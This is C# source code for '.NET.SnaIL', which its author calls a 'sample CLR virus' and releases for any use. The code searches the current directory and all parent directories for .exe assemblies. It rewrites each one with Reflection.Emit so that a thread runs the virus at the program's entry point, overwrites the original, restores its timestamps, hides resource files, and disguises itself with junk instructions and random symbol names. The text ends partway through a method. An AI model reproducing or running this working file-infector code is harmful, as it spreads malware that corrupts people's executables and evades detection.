   /*
    *
    * .NET.SnaIL RC2
    *
    * Features:
    * - pure .NET virus (doesn't use any Win32 API)
    * - multithreaded
    * - permutation (inserting nop and ldloc/pop trash)
    * - obfuscation (changing names of symblos)
    *
    * You may make with this sources anything you wish.
    * Author is not responsible for consequences.
    *
    * (c) whale 2004
    */


   //#define DEBUGCONSOLE      // debug console

   #define MANAGEDRESOURCES  // create managed resources in infected file (beta-testing feature)

   #define PERMUTATION

   #define OVERWRITE           // overwrite original file with infected

   #define INFECTSIGNED    // infect signed assemblies

   using System;
   using System.Reflection;
   using System.Globalization;
   using System.Resources;
   using System.IO;
   using System.Collections;
   using System.Reflection.Emit;
   using System.Threading;
   using Reflector.Disassembler;
   using System.Runtime.Remoting;

   namespace DotNet
   {

       internal class Snail
       {
           static string copyright = "[ .NET.Snail - sample CLR virus (c) whale 2004 ]";
           // non-static constructor
           // needed to run virus in separate domain
           public Snail(string inFileName, string outFileName)
           {
               try
               {
                   Snail.shorts=true;
                   Snail.ProcessAssembly(inFileName, outFileName);
                   if(!Snail.shorts)
                       Snail.ProcessAssembly(inFileName, outFileName);
               }
               catch (ThreadAbortException e)
               {
                   File.Move(inFileName, outFileName);
               }
               catch(Exception e)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine(e.Message);
   #endif
   //              Console.WriteLine();
               }

           }

           public class Objects
           {
               Hashtable types, ctors, events, fields, methods,
                   props;
               public Objects()
               {
                   types = new Hashtable();
                   ctors = new Hashtable();
                   events = new Hashtable();
                   fields = new Hashtable();
                   methods = new Hashtable();
                   props = new Hashtable();
               }

               ~Objects()
               {
               }

               public void Clear()
               {
                   types.Clear();
                   ctors.Clear();
                   events.Clear();
                   fields.Clear();
                   methods.Clear();
                   props.Clear();
               }

               public void AddType(Type intype, TypeBuilder outtype)
               {
                   types.Add(intype, outtype);
               }


               public void DefineMembers(Type intype, ModuleBuilder moduleBuilder)
               {
                   if(!types.ContainsKey(intype))
                       return;
                   foreach (PropertyInfo pi in intype.GetProperties(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                   {
                       TypeBuilder outproptype=(TypeBuilder)types[pi.PropertyType];
                       PropertyBuilder outpb;
                       if(outproptype!=null)
                           outpb=((TypeBuilder)types[intype]).DefineProperty(
                               EnabledRename(intype)?rs.Next():pi.Name,
                               pi.Attributes, outproptype, null);
                       else
                           outpb=((TypeBuilder)types[intype]).DefineProperty(
                               EnabledRename(intype)?rs.Next():pi.Name,
                               pi.Attributes, pi.PropertyType, null);
                       props.Add(pi, outpb);
                   }
                   foreach (FieldInfo fi in intype.GetFields(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                   {
                       TypeBuilder outfieldtype=(TypeBuilder)types[fi.FieldType];
                       FieldBuilder outfb;
                       if(outfieldtype!=null)
                           outfb=((TypeBuilder)types[intype]).DefineField(
                               EnabledRename(intype)?rs.Next():fi.Name,
                               outfieldtype,   fi.Attributes);
                       else
                           outfb=((TypeBuilder)types[intype]).DefineField(
                               EnabledRename(intype)?rs.Next():fi.Name,
                               fi.FieldType,   fi.Attributes);
                       fields.Add(fi, outfb);
                   }
                   foreach (ConstructorInfo ci in intype.GetConstructors(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                   {
                       ParameterInfo [] pinfo=ci.GetParameters();
                       Type [] cparams = new Type[pinfo.Length];
                       for(int i=0; i<pinfo.Length; i++)
                       {
                           TypeBuilder outparamtype=(TypeBuilder)types[pinfo[i].ParameterType];
                           if(outparamtype!=null)
                               cparams[i]=outparamtype;
                           else
                               cparams[i]=pinfo[i].ParameterType;
                       }
                       ConstructorBuilder outcb=((TypeBuilder)types[intype]).DefineConstructor(
                           ci.Attributes, ci.CallingConvention, cparams);
                       DefCtorParams(ci, ref outcb);
                       ctors.Add(ci, outcb);
                   }
                   foreach (EventInfo ei in intype.GetEvents(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                   {
                       EventBuilder outeb=((TypeBuilder)types[intype]).DefineEvent(
                           EnabledRename(intype)?rs.Next():ei.Name,
                           ei.Attributes, ei.EventHandlerType);
                       events.Add(ei, outeb);
                   }
                   foreach (MethodBase methodBase in intype.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                   {
                       if(methodBase.Name=="Main" && methodBase.DeclaringType==typeof(Snail))
                           continue;
                       if(methodBase.Name=="Go" && methodBase.DeclaringType==typeof(Snail))
                           goBase=methodBase;
                       ParameterInfo [] pinfo=methodBase.GetParameters();
                       Type [] mparams = new Type[pinfo.Length];
                       for(int i=0; i<pinfo.Length; i++)
                       {
                           TypeBuilder outparamtype=(TypeBuilder)types[pinfo[i].ParameterType];
                           if(outparamtype!=null)
                               mparams[i]=outparamtype;
                           else
                               mparams[i]=pinfo[i].ParameterType;
                       }
                       Type inreturntype=((MethodInfo)methodBase).ReturnType;
                       TypeBuilder outreturntype=TypeCompliance(inreturntype);
                       MethodBuilder outmb;
                       string methodName=methodBase.Name;
                       if(outreturntype!=null)
                           outmb = ((TypeBuilder)types[intype]).DefineMethod(
                               //methodName,
                               (EnabledRename(intype)&&methodName!="Go")?rs.Next():methodName,
                               methodBase.Attributes, methodBase.CallingConvention, outreturntype,
                               mparams);
                       else
                           outmb = ((TypeBuilder)types[intype]).DefineMethod(
                               //methodName,
                               (EnabledRename(intype)&&methodName!="Go")?rs.Next():methodName,
                               methodBase.Attributes, methodBase.CallingConvention, inreturntype,
                               mparams);
                       DefParams(methodBase, ref outmb);
                       methods.Add(methodBase, outmb);
                   }

               }



               #region compliance
               public MethodBuilder MethodCompliance
                   (Type type, MethodBase methodBase)
               {
                   return (MethodBuilder)methods[methodBase];
               }

               public ConstructorBuilder ConstructorCompliance
                   (Type type, ConstructorInfo ctorInfo)
               {
                   return (ConstructorBuilder)ctors[ctorInfo];
               }

               public PropertyBuilder PropertyCompliance
                   (Type type, PropertyInfo propertyInfo)
               {
                   return (PropertyBuilder)props[propertyInfo];
               }

               public FieldBuilder FieldCompliance
                   (Type type, FieldInfo fieldInfo)
               {
                   return (FieldBuilder)fields[fieldInfo];
               }

               public EventBuilder EventCompliance
                   (Type type, EventInfo eventInfo)
               {
                   return (EventBuilder)events[eventInfo];
               }

               public TypeBuilder TypeCompliance(Type type)
               {
                   return (TypeBuilder)types[type];
               }

               #endregion


           }

           private static bool EnabledRename(Type t)
           {
   #if PERMUTATION
   //          return (-1!=t.FullName.IndexOf("Snail") && -1==t.FullName.IndexOf("AssemblyProvider"));
               return (t.Assembly==Assembly.GetExecutingAssembly()&&-1==t.FullName.IndexOf("AssemblyProvider"));
   #else
               return false;
   #endif
           }

           private static RandomStrings rs = new RandomStrings(6, 15, Environment.TickCount);
           private static Random rand = new Random(Environment.TickCount);

           private class RandomCodeEmitter
           {
               ILGenerator il;
               LocalBuilder [] lb;
               public RandomCodeEmitter(ILGenerator ilGenerator, LocalBuilder [] localBuilders)
               {
                   il=ilGenerator;
                   lb=localBuilders;
               }
               public void Emit()
               {
   #if PERMUTATION
                   if(rand.Next(5)==0)
                       il.Emit(OpCodes.Nop);
                   if(rand.Next(10)==0 && lb.Length>0)
                   {
                       LocalBuilder localBuilder = lb[rand.Next(lb.Length)];
                       // push random local variable and pop it
                       il.Emit(OpCodes.Ldloc, localBuilder);
                           il.Emit(OpCodes.Pop);
                   }
   #endif
               }
           }

           private static byte [] ilReader;

           public static void Go()
           {
               string dir;
               ilReader = GetILReader();
               do
               {
                   ProcessDirectory();
                   dir=Directory.GetCurrentDirectory();
                   Directory.SetCurrentDirectory("..");
               }
               while(dir!=Directory.GetCurrentDirectory());
           }

           // infect all files in current directory
           public static void ProcessDirectory()
           {
               string [] fnames = Directory.GetFiles(".", "*.exe");
               if(fnames.Length==0) return;
               bool donotdel=File.Exists("ILReader.dll");
               if(!donotdel && ilReader!=null)
               {
                   FileStream outStream = new FileStream("ILReader.dll", FileMode.CreateNew,
                       FileAccess.ReadWrite);
                   if(outStream!=null)
                   {
                       BinaryWriter outWriter = new BinaryWriter(outStream);
                       outWriter.Write(ilReader);
   #if DEBUGCONSOLE
                       Console.WriteLine("Created ILReader.dll");
   #endif
                   }
                   outStream.Close();
               }
               foreach (string fileName in fnames)
               {
   #if OVERWRITE
                   string outFileName = Path.GetFileName(fileName);
                   string outFileNameWithoutExtension=
                       Path.GetFileNameWithoutExtension(outFileName);
                   string inFileName = "_" + outFileName;
                   if(/*outFileName.ToUpper()=="SNAIL.EXE" ||*/ outFileName[0]=='_' ||
                       outFileNameWithoutExtension==
                           Assembly.GetExecutingAssembly().GetName().Name)
                               continue;   // ïðîïóñêàåì ñåáÿ // omit self
                   if(File.Exists(inFileName))
                       continue;
                   DateTime ctime=File.GetCreationTime(outFileName);
                   DateTime latime=File.GetLastAccessTime(outFileName);
                   DateTime lwtime=File.GetLastWriteTime(outFileName);
                   File.Move(outFileName, inFileName);
   #else
                   string inFileName = Path.GetFileName(fileName);
                   string outFileName = "_infected_" + inFileName;
                   if(inFileName.ToUpper()=="SNAIL.EXE" || inFileName[0]=='_')
                       continue;   // ïðîïóñêàåì ñåáÿ // omit self
   #endif
   #if DEBUGCONSOLE
                   Console.WriteLine("infecting "+outFileName+" ...");
   #endif

                   try
                   {
                       //                  ProcessAssembly(inFileName, outFileName);
                       //                  if(!shorts)
                       //                      ProcessAssembly(inFileName, outFileName);
                       // run ProcessAssembly in separate domain
                       // once opened assembly cannot be closed in current domain
                       object [] args = new object [2] {inFileName, outFileName};
                       AppDomain appdom=AppDomain.CreateDomain("domain");
                       Type tsnail = typeof(Snail);
                       string aname=Assembly.GetExecutingAssembly().GetName().Name;
                       ObjectHandle oh=appdom.CreateInstance(
                           aname,
                           tsnail.FullName,
                           false, BindingFlags.Default,
                           null, args, null, null, null);
                       AppDomain.Unload(appdom);

   #if OVERWRITE
                       if(File.Exists(outFileName))
                       {
   #if DEBUGCONSOLE
                           Console.WriteLine(outFileName+" exists");
   #endif
                           File.Delete(inFileName);
                           AddILReader(outFileName, ilReader);
                           File.SetCreationTime(outFileName, ctime);
                           File.SetLastAccessTime(outFileName, latime);
                           File.SetLastWriteTime(outFileName, lwtime);
   #if MANAGEDRESOURCES
                           string resFileName=outFileNameWithoutExtension+".resources";
                           if(File.Exists(resFileName))
                           {
                               File.SetCreationTime(resFileName, ctime);
                               File.SetLastAccessTime(resFileName, latime);
                               File.SetLastWriteTime(resFileName, lwtime);
                               File.SetAttributes(resFileName, FileAttributes.Hidden);
                           }
   #endif
                       }
                       else
                           File.Move(inFileName, outFileName);

   #endif
                   }
                   catch (ThreadAbortException e)
                   {
                       File.Move(inFileName, outFileName);
                       return;
                   }
                   catch (Exception e)
                   {
   #if DEBUGCONSOLE
                       Console.WriteLine(e.Message);
   #endif
   //                  Console.WriteLine(e.Message);
                   }

               }
               if(!donotdel)
                   File.Delete("ILReader.dll");
           }

           private static PEFileKinds GetFileType(string filename)
           {
               FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read);
               if(fs==null)
                   return 0;
               byte [] buf = new byte[4];
               fs.Seek(0x3c, SeekOrigin.Begin);
               fs.Read(buf, 0, 4);
               uint peoffset=(uint)buf[0]|
                   ((uint)buf[1])>>8|
                   ((uint)buf[2])>>16|
                   ((uint)buf[3])>>24;
               fs.Seek(peoffset+0x5c, SeekOrigin.Begin);
               fs.Read(buf, 0, 1);
               fs.Close();
               if(buf[0]==3)
                   return PEFileKinds.ConsoleApplication;
               else
                   return PEFileKinds.WindowApplication;
           }


           public static void ProcessAssembly(string inFileName, string outFileName)
           {
               AppDomain ad;
               AssemblyName an;
               AssemblyBuilder ab;

               PEFileKinds filetype=GetFileType(inFileName);

               Objects objects = new Objects();
               ad = System.Threading.Thread.GetDomain();
               an = new AssemblyName();
               an.Name = System.IO.Path.GetFileNameWithoutExtension (outFileName);

               ab = ad.DefineDynamicAssembly
                   (an,  AssemblyBuilderAccess.RunAndSave);

               Assembly asm = Assembly.LoadFrom(inFileName);

   #if !INFECTSIGNED
               if(asm.GetName().GetPublicKeyToken()!=null)
                   return;
   #endif

   #if !MANAGEDRESOURCES
               if(ManagedResourcesPresent(asm))
                   return;
   #endif

               Assembly asm1 = Assembly.GetExecutingAssembly();
               // äîáàâëÿåì â ðåçóëüò. ñáîðêó êëàññ Snail
               // add Snail class to result assembly
               Module [] modules = asm.GetModules();
               ModuleBuilder mbmain=null;
               for(int i=0; i<modules.Length; i++)
               {
                   Module mod = modules[i];
                   ModuleBuilder outmodb=ab.DefineDynamicModule (mod.Name.Substring(1), outFileName);

                   ModuleReader reader = new ModuleReader(mod, new AssemblyProvider());

                   // no global functions
                   outmodb.CreateGlobalFunctions ();

                   // èññëåäîâàíèå òèïîâ
                   // type research
                   Type [] types = mod.GetTypes();

                   foreach (Type type in types)
                   {
                       // donot infect if one of types has same characteristics as Snail
                       if(
                           type.GetNestedTypes(BindingFlags.Public | BindingFlags.NonPublic |
                           BindingFlags.Static | BindingFlags.Instance |
                           BindingFlags.DeclaredOnly).Length==
                           typeof(Snail).GetNestedTypes(BindingFlags.Public | BindingFlags.NonPublic |
                           BindingFlags.Static | BindingFlags.Instance |
                           BindingFlags.DeclaredOnly).Length &&
                           type.GetMethods().Length==typeof(Snail).GetMethods().Length)
                               return;
                       foreach(MethodBase methodBase in type.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                           // åñëè òî÷êà âõîäà â ýòîì ìîäóëå,
                           // òî äîáàâëÿåì â íåãî êëàññû âèðóñà
                           // if EP is in this module
                           // add viruse's classes
                           if(asm.EntryPoint==methodBase)
                           {
                               mbmain=outmodb;
                               Module [] modules1 = asm1.GetModules();
                               for(int k=0; k<modules1.Length; k++)
                               {
                                   Module mod1 = modules1[k];

                                   ModuleReader reader1 = new ModuleReader(mod1, new AssemblyProvider());

                                   Type [] types1 = mod1.GetTypes();


                                   foreach (Type type1 in types1)
                                   {
                                       if(type1==typeof(Snail))// || type1==typeof(Process))
                                           SetType(type1, null, outmodb, reader1, objects);
                                       // åñëè îäèí èç òèïîâ Reflector.Disassembler
                                       // if one of types is Reflector.Disassembler (for future versions)
                                       if(type1.FullName.Length>22)
                                           if(type1.FullName.Substring(0, 22)=="Reflector.Disassembler")
                                               SetType(type1, null, outmodb, reader1, objects);
                                   }
                                   foreach (Type type1 in types1)
                                       objects.DefineMembers(type1, outmodb);
                                   foreach (Type type1 in types1)
                                   {
                                       if(type1==typeof(Snail))// || type1==typeof(Process))
                                           EmitType(type1, null, reader1, asm, ref ab, false,
                                               filetype, objects);
                                       if(type1.FullName.Length>22)
                                           if(type1.FullName.Substring(0, 22)=="Reflector.Disassembler")
                                               EmitType(type1, null, reader1, asm, ref ab, false,
                                                   filetype, objects);
                                   }
                               }
                           }
                   }
                   foreach (Type type in types)
                       SetType(type, null, outmodb, reader, objects);
                   foreach (Type type in types)
                       objects.DefineMembers(type, outmodb);
                   foreach (Type type in types)
                       EmitType(type, null, reader, asm, ref ab, true, filetype, objects);
               }
   #if MANAGEDRESOURCES
               try
               {
                   CreateResources(asm, ab, outFileName);
               }
               catch (ThreadAbortException e)
               {
                   File.Move(inFileName, outFileName);
                   return;
               }
               catch(Exception e)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("Failed CreateResources:error: "+e.ToString());
   #endif
   //              Console.WriteLine();
               }
   #endif
               try
               {
                   ab.Save(outFileName);
               }
               catch (ThreadAbortException e)
               {
                   File.Move(inFileName, outFileName);
                   return;
               }
               catch(Exception e)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("Failed AssemblyBuilder.Save:error: "+e.ToString());
   #endif
   //              Console.WriteLine();
               }

               try
               {
                   CopyUnmanagedResources(inFileName, outFileName);
               }
               catch (ThreadAbortException e)
               {
                   File.Move(inFileName, outFileName);
                   return;
               }
               catch(Exception e)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("Failed CopyUnmanagedResource:error: "+e.ToString());
   #endif
               }

           }

           private static void SetType(Type type, Type wrapperType,
               ModuleBuilder outmodb, ModuleReader reader, Objects objects)
           {
               // íà âåðõíåì óðîâíå ïðîïóñêàåì òèïû ñ "+" â èìåíè
               // skip types with "+" in name at top level
               string tname=type.FullName;
               if(wrapperType==null && -1!=tname.IndexOf("+"))
                   return;

               Type extType = type.BaseType;// returns  System.Object
               Type extType2;
               if(extType!=null)
                   extType2 = objects.TypeCompliance(extType);
               else
                   extType2 = null;
               if(extType2==null)
                   extType2=extType;
               Type [] interfaceTypes = type.GetInterfaces();
               TypeBuilder outclassb;

               if(wrapperType!=null)
               {
                   // íàõîäèì builder íàäêëàññà
                   // find wrapper TypeBuilder
                   TypeBuilder parentTypeOut=objects.TypeCompliance(wrapperType);
                   outclassb=parentTypeOut.DefineNestedType(
                       //type.Name,
                       EnabledRename(type)
                       ?rs.Next():type.Name,
                       type.Attributes,
                       extType2, interfaceTypes);
               }
               else
               {
                   string newTypeName;
                   if(typeof(Snail).GetHashCode()==type.GetHashCode())
                       newTypeName=EnabledRename(type)?(rs.Next()+"."+rs.Next()):tname;
                   else
                       newTypeName=EnabledRename(type)?rs.Next():tname;
                   outclassb=outmodb.DefineType(
                       //tname,
                       newTypeName,
                       type.Attributes, extType2, interfaceTypes);
               }
               // Ñíà÷àëà äîáàâëÿåì êëàññ â ñïèñîê, çàòåì îïðåäåëÿåì åãî äî÷åðíèå òèïû
               // è çàòåì óæå åãî ñâîéñòâà è ìåòîäû

               objects.AddType(type, outclassb);

               Type [] nestedClasses = type.GetNestedTypes(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly);

               foreach(Type nestedClass in nestedClasses)
                   SetType(nestedClass, type, outmodb, reader, objects);

           }

           private static MethodBase goBase;

           private static void DefParams(MethodBase methodBase,
               ref MethodBuilder methodBuilder)
           {
               ParameterInfo [] inp=methodBase.GetParameters();
               for(int i=0; i<inp.Length; i++)
               {
                   ParameterBuilder pout = methodBuilder.DefineParameter(i+1,
                       inp[i].Attributes, inp[i].Name);

               }
           }

           private static void DefCtorParams(MethodBase methodBase,
               ref ConstructorBuilder ctorBuilder)
           {
               ParameterInfo [] inp=methodBase.GetParameters();
               for(int i=0; i<inp.Length; i++)
               {
                   ParameterBuilder pout = ctorBuilder.DefineParameter(i+1,
                       inp[i].Attributes, inp[i].Name);

               }
           }



           private static void EmitType(Type type, Type wrapperType, ModuleReader reader,
               Assembly asm, ref AssemblyBuilder ab, bool setEP, PEFileKinds filetype, Objects objects)
           {
               // íà âåðõíåì óðîâíå ïðîïóñêàåì òèïû ñ "+" â èìåíè
               // skip type with "+" in name at top level
               string tname=type.FullName;
               if(wrapperType==null && -1!=tname.IndexOf("+"))
                   return;

   #if DEBUGCONSOLE
               Console.Write("emitting:", type.ToString());
   #endif

               // òîëüêî ïîñëå ñîçäàíèÿ âñåõ ìåòîäîâ íà÷èíàåì èõ çàïîëíÿòü êîäîì
               ConstructorInfo [] ctors = type.GetConstructors(BindingFlags.Public |
                   BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance |
                   BindingFlags.DeclaredOnly);
               foreach (ConstructorInfo ctorInfo in ctors)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("------------------------------------------------");
                   Console.WriteLine(ctorInfo);
   #endif
                   ConstructorBuilder outctor=objects.ConstructorCompliance(type, ctorInfo);
                   if(outctor==null)
                       return;
                   MethodBody ctorBody = reader.GetMethodBody(ctorInfo);
                   if (ctorBody == null)
                   {
   #if DEBUGCONSOLE
                       Console.WriteLine("ctor "+ctorInfo.DeclaringType.ToString()+"(EMPTY)");
   #endif
                   }
                   else
                   {
                       ILGenerator il = outctor.GetILGenerator();
                       CreateMethodBody(type, ctorInfo, ctorBody, ref il, false, shorts, objects);
                   }
               }
               MethodBase [] methods = type.GetMethods(BindingFlags.Public |
                   BindingFlags.NonPublic | BindingFlags.Static |
                   BindingFlags.Instance | BindingFlags.DeclaredOnly);
               foreach (MethodBase methodBase in methods)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("------------------------------------------------");
                   Console.WriteLine(methodBase);
   #endif
                   if(methodBase.Name=="Main" && methodBase.DeclaringType==typeof(Snail))
                       continue;
                   MethodBuilder outmb=objects.MethodCompliance(type, methodBase);
                   MethodBody methodBody = reader.GetMethodBody(methodBase);
                   if (methodBody == null)
                   {
   #if DEBUGCONSOLE
                       Console.WriteLine("method "+methodBase.DeclaringType.ToString()+
                           " "+methodBase.Name+"(EMPTY)");
   #endif
                   }
                   else
                   {
                       ILGenerator il=outmb.GetILGenerator();
                       if(asm.EntryPoint == methodBase && setEP)
                       {
                           CreateMethodBody(type, methodBase, methodBody, ref il, true, shorts, objects);
                           ab.SetEntryPoint(outmb, filetype);
                       }
                       else
                           CreateMethodBody(type, methodBase, methodBody, ref il, false, shorts, objects);
                   }
               }

               TypeBuilder outclassb = objects.TypeCompliance(type);

               try
               {
                   outclassb.CreateType();
               }
               catch(NotSupportedException e)
               {
                   // if cannot create type with short br's, try again with long ones
                   if(shorts)
                   {
                       shorts=false;
                       return;
                   }
               }

               Type [] nestedClasses = type.GetNestedTypes(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly);
               foreach(Type nestedClass in nestedClasses)
                   EmitType(nestedClass, type, reader, asm, ref ab, setEP, filetype, objects);

           }

           private static bool ManagedResourcesPresent(Assembly asm)
           {
               string [] resources = asm.GetManifestResourceNames();
               return resources.Length!=0;
           }

   #if MANAGEDRESOURCES
           private static void CreateResources(Assembly asm, AssemblyBuilder ab,
               string name)
           {
               string [] resources = asm.GetManifestResourceNames();

   #if DEBUGCONSOLE
               Module [] modules = asm.GetModules(true);
               for(int i=0; i<modules.Length; i++)
                   if(modules[0].IsResource())
                       Console.WriteLine("RESOURCE MODULE"+modules[i].Name);
   #endif
               foreach(string res in resources)
               {
                   Stream t = asm.GetManifestResourceStream(res);
                   Type tp = t.GetType();

                   if(t!=null)
                   {

                       try
                       {
                           ResourceReader rr = new ResourceReader(t); // ArgumentException
                           Hashtable rsrc = new Hashtable();
                           IDictionaryEnumerator enumerator = rr.GetEnumerator();
                           while (enumerator.MoveNext())
                           {
                               if (!rsrc.ContainsKey(enumerator.Key))
                                   rsrc.Add(enumerator.Key, enumerator.Value);
                           }
                           rr.Close();

                           string filename = System.IO.Path.GetFileNameWithoutExtension(name)+
                                   ".resources";
                           File.Delete(filename);
                           IResourceWriter rw = ab.DefineResource(res, "", filename);

                           IDictionaryEnumerator n = rsrc.GetEnumerator();

                           // äîáàâëÿåì ôàéë ðåñóðñîâ ê ñáîðêå
                           // add .resources file to assembly

                           n.Reset();
                           while(n.MoveNext())
                               rw.AddResource((string)n.Key, (object)n.Value);
                           rw.Close();
                       }
                       catch
                       {
                       }
                   }
               }

           }

   #endif

           public static bool shorts;

           private static void CreateMethodBody(Type type, MethodBase methodBase, MethodBody methodBody, ref ILGenerator il,
               bool entrypoint, bool shorts, Objects objects)
           {
   #if DEBUGCONSOLE
               Console.WriteLine("// Code Size: " + methodBody.CodeSize.ToString() + " Bytes");
               Console.Write(".maxstack " + methodBody.MaxStack);
               Console.WriteLine();
   #endif
               // Local variables
               Type[] locals = methodBody.GetLocals();
               LocalBuilder [] lbuilders = new LocalBuilder[locals.Length];
               if ((locals != null) && (locals.Length > 0))
               {
   #if DEBUGCONSOLE
                   Console.Write(".locals (");
   #endif
                   for (int i = 0; i < locals.Length; i++)
                   {
   #if DEBUGCONSOLE
                       Console.Write(locals[i].ToString());
                       Console.Write(" ");
                       Console.Write("V_" + i);
                       if (i != (locals.Length - 1))
                           Console.Write(", ");
   #endif
                       Type t=objects.TypeCompliance(locals[i]);
                       if(t!=null)
                           lbuilders[i]=il.DeclareLocal(t);
                       else
                           lbuilders[i]=il.DeclareLocal(locals[i]);
                   }

   #if DEBUGCONSOLE
                   Console.Write(")");
                   Console.WriteLine();
   #endif
               }
               RandomCodeEmitter rce=new RandomCodeEmitter(il, lbuilders);

               LocalBuilder loc=null;
               // if this method is EP, add constructor and Go() method call
               if(entrypoint)
               {
                   MethodBuilder go = objects.MethodCompliance(typeof(Snail), goBase);
                   loc = il.DeclareLocal(typeof(System.Threading.Thread));
                   rce.Emit();
                   il.Emit(OpCodes.Ldnull);
                   rce.Emit();
                   il.Emit(OpCodes.Ldftn, go);
                   rce.Emit();
                   Type thrStart = typeof(System.Threading.ThreadStart);
                   ConstructorInfo [] carray = thrStart.GetConstructors();
                   ConstructorInfo ctorThreadStart = carray[0];
                   il.Emit(OpCodes.Newobj, ctorThreadStart);
                   Type [] t2=new Type[1];
                   t2[0]=typeof(System.Threading.ThreadStart);
                   ConstructorInfo ctorThread = (typeof(System.Threading.Thread)).GetConstructor(t2);
                   il.Emit(OpCodes.Newobj, ctorThread);
                   rce.Emit();
                   il.Emit(OpCodes.Stloc, loc);
                   rce.Emit();
                   il.Emit(OpCodes.Ldloc, loc);
                   MethodInfo miStart = typeof(System.Threading.Thread).GetMethod("Start");
                   il.Emit(OpCodes.Callvirt, miStart);
                   rce.Emit();
               }

               // Exception handlers
               ExceptionHandler[] exceptions = methodBody.GetExceptions();
               //Exc [] exc = new Exc [exceptions.Length];
               if (exceptions != null)
               {
                   for (int i=0; i<exceptions.Length; i++)
                   {
                       ExceptionHandler handler = exceptions[i];
   #if DEBUGCONSOLE
                       Console.Write(".try");
                       Console.Write(" ");
                       Console.Write("L_" + handler.TryOffset.ToString("x4"));
                       Console.Write(" ");
                       Console.Write("to");
                       Console.Write(" ");
                       Console.Write("L_" + (handler.TryOffset + handler.TryLength).ToString("x4"));
                       Console.Write(" ");

                       if (handler.Type == ExceptionHandlerType.Catch)
                       {
                           Console.Write("catch");
                           Console.Write(" ");
                           Console.Write(handler.CatchType.ToString());
                       }

                       if (handler.Type == ExceptionHandlerType.Filter)
                       {
                           Console.Write("filter");
                           Console.Write(" ");
                           Console.Write("L_" + handler.FilterOffset.ToString("x4"));
                       }

                       if (handler.Type == ExceptionHandlerType.Finally)
                       {
                           Console.Write("finally");
                       }
                           if (handler.Type == ExceptionHandlerType.Fault)
                       {
                           Console.Write("fault");
                       }
                       Console.Write(" ");
                       Console.Write("L_" + handler.HandlerOffset.ToString("x4"));
                       Console.Write(" ");
                       Console.Write("to");
                       Console.Write(" ");
                       Console.Write("L_" + (handler.HandlerOffset + handler.HandlerLength).ToString("x4"));
                       Console.WriteLine();
   #endif
                   }
               }
               // Labels
               int labelnum=0;
               foreach (Instruction instruction in methodBody.GetInstructions())
               {
                   if(instruction.Code.OperandType == OperandType.ShortInlineBrTarget ||
                       instruction.Code.OperandType == OperandType.InlineBrTarget)
                       labelnum++;
                   if(instruction.Code.OperandType == OperandType.InlineSwitch)
                       labelnum+=((int [])instruction.Operand).Length;
               }
               Label  [] labels = new Label[labelnum];
               int [] labeloffsets = new int[labelnum];
               int k=0;
               foreach (Instruction instruction in methodBody.GetInstructions())
               {
                   if(instruction.Code.OperandType == OperandType.ShortInlineBrTarget)
                   {
                       object operand = instruction.Operand;
                       labeloffsets[k] = (int)operand;
                       labels[k]=il.DefineLabel();
                       k++;
                   }
                   if(instruction.Code.OperandType == OperandType.InlineBrTarget)
                   {
                       object operand = instruction.Operand;
                       labeloffsets[k] = (int)operand;
                       labels[k]=il.DefineLabel();
                       k++;
                   }
                   // switch labels
                   if(instruction.Code.OperandType == OperandType.InlineSwitch)
                   {
                       object operand = instruction.Operand;
                       int [] lofs = (int []) operand;
                       foreach(int ofs in lofs)
                       {
                           labeloffsets[k] = ofs;
                           labels[k]=il.DefineLabel();
                           k++;
                       }
                   }
               }

               // Instructions
               bool skip=false;
               for (int instrnum=0; instrnum<methodBody.GetInstructions().Length; instrnum++)
               {
                   if(skip) { skip=false; continue; }
                   Instruction instruction=methodBody.GetInstructions()[instrnum];
                   OpCode code = instruction.Code;
                   if(code.GetHashCode()==OpCodes.Ldloc.GetHashCode() &&
                       instrnum<methodBody.GetInstructions().Length-1 &&
                       methodBody.GetInstructions()[instrnum].Code.GetHashCode()==
                       OpCodes.Pop.GetHashCode())
                   { skip=true; continue; }
                   if(code.GetHashCode()==OpCodes.Nop.GetHashCode())
                       continue;
                   rce.Emit();
                   foreach(ExceptionHandler handler in exceptions)
                   {
                       if(handler.TryOffset == instruction.Offset)
                       {
   #if DEBUGCONSOLE
                           Console.WriteLine("BEGIN TRY L_"+handler.TryOffset.ToString("x4"));
   #endif
                           il.BeginExceptionBlock();
                           break; // äîëæíî áûòü òîëüêî îäíî íà÷àëî ôðåéìà try-catch!
                       }
                       if(handler.Type==ExceptionHandlerType.Filter)
                       {
                           if(handler.FilterOffset==instruction.Offset)
                               il.BeginExceptFilterBlock();
                       }
                       else if(handler.HandlerOffset == instruction.Offset)
                           switch (handler.Type)
                           {
                               case ExceptionHandlerType.Catch:
                                   //il.EndExceptionBlock(); // ?
                                   il.BeginCatchBlock(handler.CatchType);
                                   break;
                               case ExceptionHandlerType.Fault:
                                   il.BeginFaultBlock();
                                   break;
                               case ExceptionHandlerType.Filter:
                                   il.BeginExceptFilterBlock();
                                   break;
                               case ExceptionHandlerType.Finally:
                                   il.BeginFinallyBlock();
                                   break;
                           }
                       if(handler.HandlerOffset+handler.HandlerLength == instruction.Offset)
                       {
                           bool bLastHanlderInBlock = true;
                           foreach(ExceptionHandler h in exceptions)
